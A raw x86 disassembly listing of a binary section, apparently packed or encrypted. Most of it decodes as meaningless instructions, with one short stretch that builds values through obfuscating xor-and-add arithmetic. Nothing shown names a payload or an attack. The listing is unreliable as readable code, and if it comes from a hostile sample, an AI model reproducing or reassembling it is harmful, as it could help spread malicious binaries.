  402923:	mov    ah,0xa2
  402925:	outs   dx,BYTE PTR ds:[esi]
  402926:	lock and BYTE PTR [ebp-0xc9872c0],al
  40292d:	enter  0x17b3,0x8
  402931:	sub    bh,BYTE PTR ds:0x366ff64f
  402937:	inc    esi
  402938:	test   DWORD PTR [edx-0x363e6183],eax
  40293e:	cmp    eax,0xc61c81dc
  402943:	adc    al,0xb
  402945:	push   eax
  402946:	or     ebx,DWORD PTR [edi]
  402948:	das    
  402949:	std    
  40294a:	mov    cl,0xb8
  40294c:	aam    0x30
  40294e:	mov    WORD PTR [edx+ecx*2],?
  402951:	rol    ecx,cl
  402953:	xchg   ebx,eax
  402954:	repz sbb dl,BYTE PTR [eax+0x227930db]
  40295b:	push   eax
  40295c:	jo     0x402999
  40295e:	lods   al,BYTE PTR gs:[esi]
  402960:	mov    fs,ebx
  402962:	iret   
  402963:	pushf  
  402964:	mov    DWORD PTR [edx-0x54],esi
  402967:	les    esi,FWORD PTR [ebx]
  402969:	pop    ds
  40296a:	loop   0x4029d8
  40296c:	nop
  40296d:	int3   
  40296e:	inc    ebp
  40296f:	pop    es
  402970:	or     ecx,DWORD PTR [esi+edx*4-0x1f48347f]
  402977:	iret   
  402978:	mul    BYTE PTR [eax+0x68]
  40297b:	push   0x21
  40297d:	adc    eax,0x4bf8709f
  402982:	add    al,0x19
  402984:	mov    bl,0x5f
  402986:	pushf  
  402987:	mov    al,0xf7
  402989:	inc    eax
  40298a:	pop    ebx
  40298b:	dec    edx
  40298c:	xor    BYTE PTR [ecx+0x4cfc4683],al
  402992:	sub    BYTE PTR [edi+edi*1],bh
  402995:	mov    ah,0xad
  402997:	jb     0x40292e
  402999:	out    dx,eax
  40299a:	lds    esp,FWORD PTR [edi-0x5e]
  40299d:	jecxz  0x4029e3
  40299f:	retf   0x9b0
  4029a2:	mov    DWORD PTR [ecx-0x4fd973d9],0x870f3639
  4029ac:	sbb    eax,0x61da0de2
  4029b1:	xchg   ecx,eax
  4029b2:	pop    ebp
  4029b3:	ficom  WORD PTR [ecx+ebx*4+0x53]
  4029b7:	xchg   bl,bh
  4029b9:	sub    al,0x8d
  4029bb:	pop    esp
  4029bc:	add    dh,ah
  4029be:	jmp    0x4029dd
  4029c0:	pushf  
  4029c1:	jbe    0x4029e0
  4029c3:	hlt    
  4029c4:	jmp    0x4029ec
  4029c6:	dec    ebx
  4029c7:	loope  0x402956
  4029c9:	in     eax,dx
  4029ca:	es push es
  4029cc:	ins    DWORD PTR es:[edi],dx
  4029cd:	loop   0x40299e
  4029cf:	mov    al,0x19
  4029d1:	sub    ecx,ecx
  4029d3:	in     al,dx
  4029d4:	hlt    
  4029d5:	rol    ebp,0x6b
  4029d8:	(bad)  
  4029d9:	hlt    
  4029da:	xchg   ebp,eax
  4029db:	pushf  
  4029dc:	jns    0x402a30
  4029de:	sub    ebp,DWORD PTR [eax+0x56]
  4029e1:	dec    edx
  4029e2:	cdq    
  4029e3:	sub    ah,cl
  4029e5:	test   BYTE PTR [ebx+0x23],ch
  4029e8:	jl     0x402a48
  4029ea:	clc    
  4029eb:	mov    ebp,0xba3aa02b
  4029f0:	sub    DWORD PTR [eax],eax
  4029f2:	fs pop ecx
  4029f4:	inc    esp
  4029f5:	mov    ah,0x81
  4029f7:	(bad)  
  4029f8:	jl     0x402982
  4029fa:	ins    DWORD PTR es:[edi],dx
  4029fb:	inc    esi
  4029fc:	idiv   BYTE PTR [ecx]
  4029fe:	sub    al,0x57
  402a00:	retf   
  402a01:	adc    eax,0x8e2f5f5e
  402a06:	ret    0xdb22
  402a09:	je     0x4029ec
  402a0b:	push   0x83182250
  402a10:	jns    0x402a0d
  402a12:	pop    ebx
  402a13:	lock arpl cx,sp
  402a16:	js     0x402a10
  402a18:	jo     0x4029da
  402a1a:	jl     0x4029fc
  402a1c:	(bad)  
  402a1d:	sub    cl,dl
  402a1f:	popa   
  402a20:	mov    ecx,0xef6bd0c7
  402a25:	(bad)  
  402a26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a27:	fadd   DWORD PTR [esi-0x52]
  402a2a:	and    al,0x2e
  402a2c:	pop    ecx
  402a2d:	ja     0x402a9c
  402a2f:	inc    eax
  402a30:	mov    edx,0x9fb64b9
  402a35:	jp     0x4029da
  402a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a38:	adc    edx,ebx
  402a3a:	call   0x2e87:0x8efa812c
  402a41:	loope  0x4029ef
  402a43:	mov    bl,0xc5
  402a45:	popa   
  402a46:	ins    DWORD PTR es:[edi],dx
  402a47:	inc    eax
  402a48:	stc    
  402a49:	retf   
  402a4a:	push   es
  402a4b:	sti    
  402a4c:	stc    
  402a4d:	lock pop ebx
  402a4f:	mov    dl,0xbf
  402a51:	popf   
  402a52:	loop   0x402a9e
  402a54:	stos   BYTE PTR es:[edi],al
  402a55:	int3   
  402a56:	dec    edx
  402a57:	xor    DWORD PTR [eax+ebp*1-0x5d2b47bb],ebx
  402a5e:	pushf  
  402a5f:	or     eax,DWORD PTR ds:0xc89170a1
  402a65:	cdq    
  402a66:	push   ebp
  402a67:	rcr    DWORD PTR [esp+esi*8],1
  402a6a:	imul   esi,esi,0xa9ab1aef
  402a70:	cs js  0x402a09
  402a73:	stos   BYTE PTR es:[edi],al
  402a74:	jns    0x402ae1
  402a76:	push   edx
  402a77:	mov    BYTE PTR [edx+eiz*1+0x78477417],0x1c
  402a7f:	xor    al,0xb2
  402a81:	int3   
  402a82:	or     DWORD PTR [ebx+0x759d4b54],eax
  402a88:	adc    DWORD PTR [edi-0xf1ef4ed],edx
  402a8e:	js     0x402aaa
  402a90:	cmc    
  402a91:	inc    ebp
  402a92:	iret   
  402a93:	stos   DWORD PTR es:[edi],eax
  402a94:	adc    eax,0xa52dc0b4
  402a99:	leave  
  402a9a:	(bad)  
  402a9b:	daa    
  402a9c:	add    BYTE PTR [edi+0x71],dl
  402a9f:	test   BYTE PTR [edx+0x556055ab],cl
  402aa5:	add    al,0x3e
  402aa7:	jge    0x402ac6
  402aa9:	add    al,0x40
  402aab:	xchg   edx,eax
  402aac:	mov    DWORD PTR [ebx],0xd05f2fef
  402ab2:	std    
  402ab3:	cld    
  402ab4:	cmp    al,BYTE PTR [ebx]
  402ab6:	cmc    
  402ab7:	out    dx,eax
  402ab8:	pop    es
  402ab9:	mov    BYTE PTR [esi-0x72f95e29],bh
  402abf:	loope  0x402aa9
  402ac1:	in     al,dx
  402ac2:	add    al,0x7d
  402ac4:	leave  
  402ac5:	dec    esp
  402ac6:	js     0x402aa5
  402ac8:	pop    ecx
  402ac9:	mov    bh,0x68
  402acb:	dec    esi
  402acc:	xor    al,0x9f
  402ace:	or     BYTE PTR [ecx-0x59],0xec
  402ad2:	or     ebp,DWORD PTR [edi-0x29]
  402ad5:	or     cl,bh
  402ad7:	pop    esi
  402ad8:	jge    0x402ad7
  402ada:	arpl   WORD PTR [eax-0x124a6215],di
  402ae0:	or     DWORD PTR [ecx],ecx
  402ae2:	jae    0x402b50
  402ae4:	jbe    0x402aa4
  402ae6:	xor    al,0xb4
  402ae8:	pop    ss
  402ae9:	xor    DWORD PTR [edi-0x46],ebx
  402aec:	mov    ch,dl
  402aee:	jecxz  0x402b5b
  402af0:	imul   DWORD PTR [edx]
  402af2:	test   eax,0xb6976216
  402af7:	pop    ebx
  402af8:	or     eax,DWORD PTR [ecx+0x72116d31]
  402afe:	xchg   edx,eax
  402aff:	mov    ah,0x10
  402b01:	inc    ebx
  402b02:	ror    cl,1
  402b04:	lds    ebx,FWORD PTR [ecx+0x51d5c356]
  402b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b0b:	and    DWORD PTR [esi+0x770fd5b3],esi
  402b11:	daa    
  402b12:	xor    eax,0xb475f009
  402b17:	(bad)  [esp+ebp*4-0xfc55653]
  402b1e:	jp     0x402b9f
  402b20:	stos   BYTE PTR es:[edi],al
  402b21:	xor    DWORD PTR [esi+0x51b93e3],edi
  402b27:	inc    esi
  402b28:	push   ss
  402b29:	out    dx,eax
  402b2a:	inc    ebp
  402b2b:	sub    DWORD PTR [ecx+0x49a2c021],edx
  402b31:	pop    eax
  402b32:	ror    BYTE PTR [ecx],1
  402b34:	lahf   
  402b35:	adc    BYTE PTR [ebx],bl
  402b37:	mov    ds:0xde24770a,al
  402b3c:	push   eax
  402b3d:	aaa    
  402b3e:	stos   BYTE PTR es:[edi],al
  402b3f:	ret    0x890a
  402b42:	aad    0x33
  402b44:	adc    BYTE PTR [ebp-0x3a],0x44
  402b48:	fiadd  DWORD PTR [edx]
  402b4a:	lahf   
  402b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b4c:	mov    ah,0xe6
  402b4e:	sub    esp,DWORD PTR [ebx+ebx*1-0x35]
  402b52:	xlat   BYTE PTR ds:[ebx]
  402b53:	pop    ecx
  402b54:	mov    cl,0xe0
  402b56:	fsubr  DWORD PTR [ebx-0x46727a34]
  402b5c:	adc    ecx,eax
  402b5e:	lds    edi,FWORD PTR [eax]
  402b60:	push   esi
  402b61:	aas    
  402b62:	mov    eax,0x9be8c072
  402b67:	pop    es
  402b68:	inc    eax
  402b69:	pop    ss
  402b6a:	sub    bh,BYTE PTR [ebp+edx*2+0x5913b452]
  402b71:	xchg   BYTE PTR [ebp+0x6ea2c83b],bl
  402b77:	and    al,BYTE PTR [ecx-0x75]
  402b7a:	fnstsw WORD PTR [esi-0x6e]
  402b7d:	or     BYTE PTR [ecx+0x363c5a2e],ch
  402b83:	loop   0x402baf
  402b85:	push   cs
  402b86:	(bad)  
  402b89:	mov    DWORD PTR [ecx-0x3],ecx
  402b8c:	cli    
  402b8d:	repz in al,0x2e
  402b90:	pop    ds
  402b91:	cmp    BYTE PTR ds:0xf5d1d943,ah
  402b97:	xchg   esi,eax
  402b98:	xchg   DWORD PTR [eax-0x768505df],ebp
  402b9e:	daa    
  402b9f:	test   DWORD PTR [edi],esi
  402ba1:	fs or  eax,0xc306f32c
  402ba7:	and    eax,0x2781a872
  402bac:	repnz or dh,BYTE PTR [eax+0x59ab75c1]
  402bb3:	push   esp
  402bb4:	push   esi
  402bb5:	(bad)  
  402bb6:	int    0x15
  402bb8:	push   esp
  402bb9:	mov    DWORD PTR gs:[ebx-0x166c8462],ebp
  402bc0:	jnp    0x402baf
  402bc2:	push   esi
  402bc3:	sub    al,0x3c
  402bc5:	xchg   BYTE PTR [eax+0x23f0768b],dl
  402bcb:	ror    ebx,cl
  402bcd:	fisttp QWORD PTR [edx-0x70]
  402bd0:	cs cli 
  402bd2:	lahf   
  402bd3:	stc    
  402bd4:	push   eax
  402bd5:	xor    DWORD PTR [ecx+0x7d5b84e1],0xfa85aab9
  402bdf:	ins    DWORD PTR es:[edi],dx
  402be0:	ins    DWORD PTR es:[edi],dx
  402be1:	call   0xf6c5:0x8a4145b2
  402be8:	jne    0x402bed
  402bea:	inc    ebx
  402beb:	sub    DWORD PTR [eax+0x47],0x11d9aa0b
  402bf2:	pop    edx
  402bf3:	push   eax
  402bf4:	std    
  402bf5:	pop    es
  402bf6:	push   ebx
  402bf7:	add    ax,0xf9a5
  402bfb:	sbb    BYTE PTR [edx],ch
  402bfd:	addr16 adc esi,ebp
  402c00:	sbb    eax,0xb2ca0aa7
  402c05:	pop    edi
  402c06:	cmp    BYTE PTR [esi-0x26],dh
  402c09:	jmp    0x9d57565b
  402c0e:	jo     0x402bfb
  402c10:	(bad)  
  402c11:	popf   
  402c12:	or     esp,DWORD PTR [esi+0x3c]
  402c15:	lahf   
  402c16:	stc    
  402c17:	add    eax,0x92c2be93
  402c1c:	test   bl,al
  402c1e:	or     DWORD PTR [eax],edx
  402c20:	sub    BYTE PTR [ebx-0x4d],0xd
  402c24:	in     eax,0xd6
  402c26:	push   ds
  402c27:	adc    bh,bh
  402c29:	or     esi,DWORD PTR [ebp-0x23c156eb]
  402c2f:	mov    bl,0x9d
  402c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c32:	retf   0x332d
  402c35:	or     edx,0xd3477018
  402c3b:	out    0x3b,eax
  402c3d:	add    DWORD PTR [esi],esp
  402c3f:	sub    al,0x39
  402c41:	mov    ecx,0x117d32b5
  402c46:	jmp    0x69a38ffd
  402c4b:	sbb    dl,bh
  402c4d:	mov    ecx,0x1a9c7d0a
  402c52:	push   esp
  402c53:	in     eax,dx
  402c54:	sbb    al,0x55
  402c56:	mov    ?,WORD PTR [edi+0x121cc1a9]
  402c5c:	repnz push ss
  402c5e:	std    
  402c5f:	or     al,0x40
  402c61:	jecxz  0x402cd2
  402c63:	inc    ebx
  402c64:	rol    esi,1
  402c66:	das    
  402c67:	stc    
  402c68:	cdq    
  402c69:	adc    al,0xb9
  402c6b:	push   ss
  402c6c:	sar    bl,cl
  402c6e:	push   edi
  402c6f:	int    0xa4
  402c71:	(bad)  
  402c72:	aaa    
  402c73:	ins    DWORD PTR es:[edi],dx
  402c74:	pop    ebx
  402c75:	jmp    0x4f3a7ecc
  402c7a:	jmp    0x402c6a
  402c7c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  402c7e:	in     al,dx
  402c7f:	cmp    ecx,ebx
  402c81:	ins    BYTE PTR es:[edi],dx
  402c82:	mov    dl,0xff
  402c84:	dec    esp
  402c85:	or     al,0xfd
  402c87:	cmp    DWORD PTR [edx+0x0],eax
  402c8a:	leave  
  402c8b:	xlat   BYTE PTR ds:[ebx]
  402c8c:	icebp  
  402c8d:	nop
  402c8e:	jmp    0xc477eb07
  402c93:	fwait
  402c94:	xchg   esp,eax
  402c95:	push   ss
  402c96:	pop    ecx
  402c97:	mov    bl,bh
  402c99:	imul   esp,DWORD PTR [edi-0x5b],0xed6e7759
  402ca0:	iret   
  402ca1:	sbb    al,0x4a
  402ca3:	mov    al,0x3e
  402ca5:	repnz xor eax,0xf0ac02d3
  402cab:	cdq    
  402cac:	add    esi,DWORD PTR [ebx]
  402cae:	cmp    eax,0x65ce5f2e
  402cb3:	dec    edi
  402cb4:	dec    eax
  402cb5:	pop    edi
  402cb6:	pop    ebx
  402cb7:	fsubr  st(1),st
  402cb9:	add    BYTE PTR [ebx],al
  402cbb:	cmc    
  402cbc:	hlt    
  402cbd:	adc    DWORD PTR [ecx+0xaa05],esp
  402cc3:	add    BYTE PTR [eax-0x75],dl
  402cc6:	inc    ebp
  402cc7:	call   0x1d8ad57
  402ccc:	add    BYTE PTR [eax],al
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	fldcw  WORD PTR fs:[edi+ebp*4-0x3]
  402d42:	cwde   
  402d43:	or     DWORD PTR [esi+0x7e],edi
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402cf4
  402d4b:	repnz or dl,BYTE PTR [edi+0x158964da]
  402d52:	pop    ebx
  402d53:	mov    dl,0xa8
  402d55:	fdiv   DWORD PTR [ecx+0x710a1ddd]
  402d5b:	pushf  
  402d5c:	scas   al,BYTE PTR es:[edi]
  402d5d:	cmp    al,BYTE PTR [ecx]
  402d5f:	pop    ebx
  402d60:	lods   eax,DWORD PTR ds:[esi]
  402d61:	hlt    
  402d62:	mov    edx,0xd10fd5e8
  402d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d68:	aas    
  402d69:	sub    al,0x8f
  402d6b:	cs push edi
  402d6d:	dec    ebx
  402d6e:	mov    WORD PTR [edx-0x5b],fs
  402d71:	add    BYTE PTR [edx-0xf],al
  402d74:	sti    
  402d75:	icebp  
  402d76:	push   edi
  402d77:	and    ch,BYTE PTR [edx+ebp*1]
  402d7a:	adc    ecx,DWORD PTR [edx-0x17eaa238]
  402d80:	les    eax,FWORD PTR [ebp+eiz*1+0x18f35c56]
  402d87:	mov    BYTE PTR ds:0xbb09342e,bl
  402d8d:	pop    ecx
  402d8e:	cmp    eax,0xc2c56c83
  402d93:	push   eax
  402d94:	push   ecx
  402d95:	in     al,dx
  402d96:	(bad)
  402d9b:	or     al,0x1d
  402d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d9e:	jns    0x402d69
  402da0:	push   esp
  402da1:	xor    eax,DWORD PTR [edi]
  402da3:	rcl    cl,cl
  402da5:	scas   al,BYTE PTR es:[edi]
  402da6:	mov    bh,0x70
  402da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402da9:	jb     0x402e1e
  402dab:	imul   esi,ebx,0x5c
  402dae:	(bad)  
  402daf:	sahf   
  402db0:	arpl   sp,di
  402db2:	xchg   BYTE PTR [edi-0x660547c3],bh
  402db8:	shr    bh,0xd9
  402dbb:	sub    ah,BYTE PTR [eax]
  402dbd:	es pop edi
  402dbf:	and    cl,dh
  402dc1:	fs dec edx
  402dc3:	or     BYTE PTR ds:0x38268183,ch
  402dc9:	mov    al,ds:0xa4ade50e
  402dce:	cwde   
  402dcf:	sub    al,0xba
  402dd1:	inc    ecx
  402dd2:	mov    esi,0x5ca4c0a8
  402dd7:	cmp    esp,DWORD PTR [eax]
  402dd9:	les    eax,FWORD PTR [eax+edx*8-0x33]
  402ddd:	mov    DWORD PTR [edx+edx*8+0x67],ecx
  402de1:	lods   al,BYTE PTR ds:[esi]
  402de2:	dec    ebx
  402de3:	(bad)  
  402de4:	xchg   ecx,eax
  402de5:	sub    ebx,edx
  402de7:	test   eax,0xfa058822
  402dec:	call   DWORD PTR [ebx+0x67badfbf]
  402df2:	push   DWORD PTR [edx-0x2e80951a]
  402df8:	inc    edi
  402df9:	add    DWORD PTR [ebx-0x21],eax
  402dfc:	sti    
  402dfd:	sub    eax,0x593d0d6a
  402e02:	mov    ebp,0xb56aa6fe
  402e07:	sbb    al,BYTE PTR [esi-0x41fa0f11]
  402e0d:	adc    DWORD PTR [ecx],0x1277552d
  402e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e14:	stos   DWORD PTR es:[edi],eax
  402e15:	pop    ebx
  402e16:	xchg   ebp,eax
  402e17:	fld    DWORD PTR [edx+0x3dfbc688]
  402e1d:	pusha  
  402e1e:	outs   dx,DWORD PTR ds:[esi]
  402e1f:	adc    DWORD PTR [esi+0x4f8e3ce4],0xf6d72462
  402e29:	xchg   edx,eax
  402e2a:	adc    BYTE PTR [edx+0x24],ah
  402e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e2e:	dec    esp
  402e2f:	xchg   edx,eax
  402e30:	xor    eax,0xa1d2e775
  402e35:	fwait
  402e36:	lea    ebx,gs:[eax-0x4]
  402e3a:	pop    esi
  402e3b:	cmp    ah,ah
  402e3d:	mov    ah,BYTE PTR [edx]
  402e3f:	in     eax,dx
  402e40:	mov    esp,0x8ceeb548
  402e45:	pop    esp
  402e46:	hlt    
  402e47:	ret    0x86e
  402e4a:	inc    esi
  402e4b:	fidivr WORD PTR [edi+edx*4]
  402e4e:	inc    ebp
  402e4f:	adc    BYTE PTR [ecx-0x570b1347],ch
  402e55:	adc    BYTE PTR [edi+0x3d],bh
  402e58:	jne    0x402e41
  402e5a:	and    DWORD PTR [eax],esp
  402e5c:	lds    edi,FWORD PTR [edi+0x48]
  402e5f:	cli    
  402e60:	push   esp
  402e61:	xor    edx,ebp
  402e63:	fs inc eax
  402e65:	shl    ch,0xe0
  402e68:	jnp    0x402e53
  402e6a:	sbb    DWORD PTR [eax+0x6792fcd0],eax
  402e70:	idiv   DWORD PTR [eax-0x67]
  402e73:	jmp    0x402df6
  402e75:	adc    al,0x47
  402e77:	jb     0x402ebe
  402e79:	lds    esp,FWORD PTR [ebp-0x208a24cc]
  402e7f:	fdivr  DWORD PTR [esi-0x27]
  402e82:	inc    ecx
  402e83:	dec    ecx
  402e84:	jmp    0xcff1:0xa38ed02a
  402e8b:	aas    
  402e8c:	xor    bh,bl
  402e8e:	int3   
  402e8f:	xchg   ebp,eax
  402e90:	xchg   esp,eax
  402e91:	xor    ebx,DWORD PTR [esi]
  402e93:	dec    esp
  402e94:	jo     0x402e6e
  402e96:	sub    DWORD PTR [ecx+edi*1],ebp
  402e99:	cmp    eax,DWORD PTR [edx+0x36]
  402e9c:	sbb    eax,0x4cb04fcc
  402ea1:	sbb    ah,BYTE PTR [esp+edx*8]
  402ea4:	test   al,0xc7
  402ea6:	(bad)
  402eaa:	or     eax,0xa41ea09
  402eaf:	sub    eax,0x3b48e4e2
  402eb4:	ss icebp 
  402eb6:	(bad)
  402eb9:	jle    0x402e42
  402ebb:	popa   
  402ebc:	ins    DWORD PTR es:[edi],dx
  402ebd:	push   0xbcfa8be0
  402ec2:	test   eax,0x657a6d50
  402ec7:	into   
  402ec8:	pop    ecx
  402ec9:	jae    0x402e94
  402ecb:	push   0xffffff93
  402ecd:	rcl    DWORD PTR [ebp+0x50],0x36
  402ed1:	pop    ebp
  402ed2:	cwde   
  402ed3:	inc    ebx
  402ed4:	mov    esi,0x2a8ef23c
  402ed9:	dec    edx
  402eda:	inc    esi
  402edb:	push   ebp
  402edc:	dec    esp
  402edd:	jp     0x402eae
  402edf:	jae    0x402f03
  402ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ee2:	not    BYTE PTR [edx]
  402ee4:	adc    BYTE PTR [esi+0x8a3a799],0x64
  402eeb:	sbb    edi,DWORD PTR [eax]
  402eed:	test   BYTE PTR [ecx-0x1c],bh
  402ef0:	in     al,0xfa
  402ef2:	dec    ecx
  402ef3:	pop    ebx
  402ef4:	xchg   edx,eax
  402ef5:	sub    BYTE PTR [edi-0x39c46779],bl
  402efb:	stos   DWORD PTR es:[edi],eax
  402efc:	dec    ebp
  402efd:	jnp    0x402ed1
  402eff:	mov    ebx,DWORD PTR [edi-0x7f1e1682]
  402f05:	fst    QWORD PTR [ebp+0x5c]
  402f08:	cld    
  402f09:	(bad)  
  402f0a:	aaa    
  402f0b:	mov    ah,0x1b
  402f0d:	adc    eax,0x2987d261
  402f12:	andps  xmm4,XMMWORD PTR [esi+0x5c8155e3]
  402f19:	cmp    eax,0x5e3feccd
  402f1e:	iret   
  402f1f:	xchg   esp,eax
  402f20:	adc    ecx,DWORD PTR [ebx+ebp*4+0x790b8ea6]
  402f27:	rcr    edi,cl
  402f29:	les    ebx,FWORD PTR [eax-0x1a2f2281]
  402f2f:	jmp    0x402f77
  402f31:	dec    eax
  402f32:	push   ss
  402f33:	scas   eax,DWORD PTR es:[edi]
  402f34:	mov    edi,0x38147a19
  402f39:	sub    ecx,DWORD PTR ds:0x984c81e7
  402f3f:	sbb    eax,0xa0b3d0d2
  402f44:	in     al,0xb1
  402f46:	and    BYTE PTR [edi],0xae
  402f49:	in     al,0xa8
  402f4b:	neg    BYTE PTR [esi-0x7ab68048]
  402f51:	std    
  402f52:	mov    cl,0xd2
  402f54:	das    
  402f55:	addr16 call 0xded6:0xbbf6238f
  402f5d:	iret   
  402f5e:	fs cwde 
  402f60:	pop    edx
  402f61:	xor    BYTE PTR [ecx],0xd3
  402f64:	pop    esi
  402f65:	mov    al,0xfc
  402f67:	dec    ebx
  402f68:	pop    ds
  402f69:	sub    dl,bl
  402f6b:	xchg   ebx,eax
  402f6c:	and    BYTE PTR [edi],0xa3
  402f6f:	into   
  402f70:	out    0x35,eax
  402f72:	mov    dl,BYTE PTR [eax+0x6397ab97]
  402f78:	and    ecx,ebx
  402f7a:	lods   eax,DWORD PTR ds:[esi]
  402f7b:	dec    esi
  402f7c:	sbb    dl,ah
  402f7e:	adc    dh,ah
  402f80:	leave  
  402f81:	setne  bl
  402f84:	out    dx,eax
  402f85:	sbb    eax,0x70ca277d
  402f8a:	iret   
  402f8b:	jo     0x402f61
  402f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f8e:	jg     0x402f5f
  402f90:	cld    
  402f91:	gs pop esi
  402f93:	push   esp
  402f94:	shr    bh,1
  402f96:	sar    ecx,0x9c
  402f99:	add    DWORD PTR [ebx],esp
  402f9b:	xchg   ebp,eax
  402f9c:	out    dx,al
  402f9d:	es dec edx
  402f9f:	rcl    DWORD PTR [esi],cl
  402fa1:	aam    0x2
  402fa3:	data16 jo 0x402f7e
  402fa6:	and    DWORD PTR [edi+ebx*4+0x58820b10],ecx
  402fad:	in     eax,0xa6
  402faf:	cmp    eax,0x50739762
  402fb4:	pop    esi
  402fb5:	bound  edx,QWORD PTR [edx+0x9]
  402fb8:	inc    esp
  402fb9:	daa    
  402fba:	push   ds
  402fbb:	mov    esp,0x6d5a3ad1
  402fc0:	repz aas 
  402fc2:	clc    
  402fc3:	es stos DWORD PTR es:[edi],eax
  402fc5:	or     bl,BYTE PTR [edx+ebp*4+0x6d]
  402fc9:	retf   
  402fca:	pop    esp
  402fcb:	sti    
  402fcc:	xlat   BYTE PTR ds:[ebx]
  402fcd:	cmp    ch,BYTE PTR [edx+0x4d5a2459]
  402fd3:	pop    ebp
  402fd4:	mov    ebp,0x37357290
  402fd9:	ja     0x403000
  402fdb:	xchg   ebp,eax
  402fdc:	les    ecx,FWORD PTR [ebx+0x31]
  402fdf:	loop   0x402fdb
  402fe1:	fiadd  DWORD PTR [esi]
  402fe3:	jae    0x403051
  402fe5:	add    eax,0xa764ea13
  402fea:	loopne 0x402ffa
  402fec:	jge    0x40303a
  402fee:	xchg   BYTE PTR [ebx+0x5dd4ade8],al
  402ff4:	pop    ecx
  402ff5:	mov    edx,0x20d29ce7
  402ffa:	cmp    DWORD PTR [esi-0x12],ecx
  402ffd:	dec    ebp
  402ffe:	mov    al,0xb7
  403000:	(bad)  
  403001:	fucomip st,st(1)
  403003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403004:	es das 
  403006:	arpl   si,si
  403008:	(bad)  [edx+ecx*2+0x91b567d]
  40300f:	pop    ds
  403010:	(bad)  
  403011:	aad    0xb3
  403013:	mov    WORD PTR [edx+0x6e],fs
  403016:	and    DWORD PTR [ebp+0xe08c214],eax
  40301c:	repz in al,0x57
  40301f:	fild   DWORD PTR [esi]
  403021:	dec    ebx
  403022:	adc    DWORD PTR [ecx],ebp
  403024:	cwde   
  403025:	jmp    0xc8edab85
  40302a:	mov    ebp,0x7e45d7f8
  40302f:	add    DWORD PTR [esi+eiz*1+0x7b1f3995],esp
  403036:	outs   dx,BYTE PTR ds:[esi]
  403037:	fisub  WORD PTR [eax-0x4a]
  40303a:	push   edx
  40303b:	xchg   esi,eax
  40303c:	pop    eax
  40303d:	pop    ecx
  40303e:	scas   eax,DWORD PTR es:[edi]
  40303f:	push   edi
  403040:	jge    0x403062
  403042:	dec    eax
  403043:	mov    ds:0x3a59f425,eax
  403048:	adc    ebp,DWORD PTR [ebp*2-0x69817ed9]
  40304f:	cli    
  403050:	adc    al,0x1a
  403052:	(bad)  
  403053:	je     0x4030bc
  403055:	sbb    al,0x56
  403057:	nop
  403058:	shl    DWORD PTR [ecx+0x50],cl
  40305b:	push   eax
  40305c:	das    
  40305d:	rcl    DWORD PTR [ecx+0x2],0x57
  403061:	pop    edx
  403062:	xor    al,BYTE PTR [edx]
  403064:	fnstenv [eax+0x5917c1c5]
  40306a:	pushf  
  40306b:	xor    BYTE PTR [edi],ch
  40306d:	sbb    bl,BYTE PTR [ebp*4-0x1aeac2e9]
  403074:	not    BYTE PTR [ecx-0x75b9595f]
  40307a:	pop    ss
  40307b:	and    eax,0x5e1a798
  403080:	dec    edi
  403081:	sahf   
  403082:	repnz sub al,BYTE PTR [ebx+0x41]
  403086:	(bad)  
  403087:	sahf   
  403088:	pushf  
  403089:	xor    eax,0xe04df412
  40308e:	push   edi
  40308f:	fnstcw WORD PTR [edi]
  403091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403092:	icebp  
  403093:	es addr16 pop es
  403096:	out    dx,eax
  403097:	and    DWORD PTR [esi-0x3ebef539],esi
  40309d:	test   BYTE PTR [edi],0xa2
  4030a0:	std    
  4030a1:	pop    ecx
  4030a2:	hlt    
  4030a3:	pop    edi
  4030a4:	enter  0x72d3,0x5c
  4030a8:	sti    
  4030a9:	sbb    eax,0x308c51b7
  4030ae:	aas    
